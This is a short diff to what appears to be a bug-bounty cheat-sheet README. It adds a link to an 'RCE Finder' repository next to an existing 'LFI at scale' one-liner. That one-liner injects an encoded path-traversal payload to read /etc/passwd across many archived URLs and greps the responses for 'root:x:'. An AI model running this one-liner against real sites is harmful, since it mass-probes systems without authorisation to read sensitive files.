@@ -33,6 +33,10 @@ https://github.com/glyptho/newassets/blob/main/automation/poc.py
 LFI at scale 🔥🔥🔥🔥
 cat rootsDomains.txt | waybackurls | qsreplace ".%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./.%5C%5C./etc/passwd" | httpx -silent -nc -mr "root:x:" -t 250 
 ```
+> RCE Finder
+```
+https://github.com/plenumlab/rce-finder
+```
 
 >Log4j Vulnerability Test
 ```
